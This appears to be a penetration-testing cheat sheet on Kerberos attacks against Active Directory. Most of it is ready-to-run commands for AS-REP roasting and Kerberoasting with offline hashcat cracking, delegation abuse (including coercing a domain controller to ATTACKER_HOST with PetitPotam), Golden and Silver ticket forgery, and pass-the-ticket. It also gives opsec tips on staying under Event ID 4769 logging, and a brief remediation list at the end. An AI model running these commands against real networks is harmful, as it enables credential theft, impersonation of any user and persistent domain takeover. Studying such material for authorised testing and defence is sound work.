---
tags:
  - Network
  - Windows
---

# :material-ticket-account: Kerberos Attacks

<span class="pill pill-hard">high value</span> <span class="pill pill-info">windows</span>

Kerberos (port 88) is AD's authentication protocol. Its design leaves several openings: you can request crackable tickets, forge tickets outright, and abuse delegation to impersonate anyone.

!!! abstract "TL;DR"
    No creds? **AS-REP roast**. Any creds? **Kerberoast** service accounts and crack offline. Own an account with delegation? **Impersonate**. Own the KRBTGT hash? **Golden Ticket** = domain forever.

## :material-clock-alert: AS-REP Roasting

<span class="pill pill-easy">no creds needed</span>

Targets accounts with *"Do not require Kerberos preauthentication"* — the DC hands you an encrypted blob you can crack offline.

```bash
# With a user list (from RID cycling), no password required
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.5 -no-pass
# With creds, find all vulnerable accounts
nxc ldap DC01 -u bob -p Pass --asreproast asrep.txt

# Crack
hashcat -m 18200 asrep.txt rockyou.txt
```

## :material-fire: Kerberoasting

<span class="pill pill-medium">any domain creds</span>

Any authenticated user can request service tickets (TGS) for accounts with an SPN. The ticket is encrypted with the service account's NT hash → crack it offline.

```bash
GetUserSPNs.py corp.local/bob:Pass -dc-ip 10.10.10.5 -request
nxc ldap DC01 -u bob -p Pass --kerberoasting kerb.txt

hashcat -m 13100 kerb.txt rockyou.txt
```

!!! loot "Service accounts are often over-privileged"
    SQL/service accounts are frequently Domain Admins with weak, rarely-rotated passwords — the whole point of Kerberoasting. Prioritize SPNs on accounts in privileged groups.

!!! opsec "Roasting requests are logged"
    Mass TGS requests trigger **Event ID 4769**. Request specific SPNs rather than the whole domain, and prefer RC4 (`etype 23`) targets which crack faster but stand out — balance speed vs. noise.

## :material-account-arrow-right: Delegation abuse

=== "Unconstrained"

    A host trusted for unconstrained delegation caches the TGT of anyone who connects. Coerce a DC to connect (PetitPotam/printerbug) → capture its TGT → DCSync.
    ```bash
    # On the compromised delegation host, monitor for tickets:
    Rubeus.exe monitor /interval:5
    # Coerce the DC to authenticate to you:
    petitpotam.py -u bob -p Pass ATTACKER_HOST DC01
    ```

=== "Constrained (S4U)"

    Account with `msDS-AllowedToDelegateTo` can impersonate users to specific services.
    ```bash
    getST.py -spn cifs/target.corp.local -impersonate Administrator \
      corp.local/svc:Pass -dc-ip 10.10.10.5
    export KRB5CCNAME=Administrator.ccache
    psexec.py -k -no-pass target.corp.local
    ```

=== "Resource-based (RBCD)"

    If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object (via ACL abuse), you can impersonate any user to it.
    ```bash
    # 1) create a computer account (default MachineAccountQuota=10)
    addcomputer.py -computer-name EVIL$ -computer-pass Pass corp.local/bob:Pass
    # 2) set RBCD on the target to trust EVIL$
    rbcd.py -delegate-from EVIL$ -delegate-to TARGET$ -action write corp.local/bob:Pass
    # 3) impersonate
    getST.py -spn cifs/target -impersonate Administrator corp.local/EVIL$:Pass
    ```

## :material-crown: Ticket forgery

!!! loot "Golden Ticket (need KRBTGT hash)"
    Forge a TGT for *any* user — total, persistent domain compromise.
    ```bash
    ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> \
      -domain corp.local Administrator
    export KRB5CCNAME=Administrator.ccache; psexec.py -k -no-pass DC01
    ```

!!! loot "Silver Ticket (need a service account hash)"
    Forge a TGS for one service (CIFS, HTTP, MSSQL…) — stealthier, no DC contact.
    ```bash
    ticketer.py -nthash <SVC_HASH> -domain-sid <SID> -domain corp.local \
      -spn cifs/target.corp.local Administrator
    ```

## :material-clock: Pass-the-Ticket & timing

```bash
# Reuse a .ccache / .kirbi ticket
export KRB5CCNAME=/path/ticket.ccache
klist                                  # confirm
# Fix clock skew (Kerberos requires <5 min drift)
sudo ntpdate 10.10.10.5   # or: faketime, rdate
```

## :material-shield-check: Remediation

- Long (25+ char) managed passwords / gMSA for service accounts.
- Require preauth; monitor 4768/4769/4624 for anomalies.
- Remove unconstrained delegation; use gMSA + constrained where needed.
- Rotate KRBTGT (twice) after any suspected DC compromise.

## :material-link-variant: Related

- Needs a user list from [SMB](smb.md) RID cycling or [Recon](recon.md).
- Golden Ticket typically follows [DCSync in Active Directory](active-directory.md).
- Persistence angle → [Persistence](../privesc/persistence.md).
- Reference: [HackTricks Kerberos](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html).
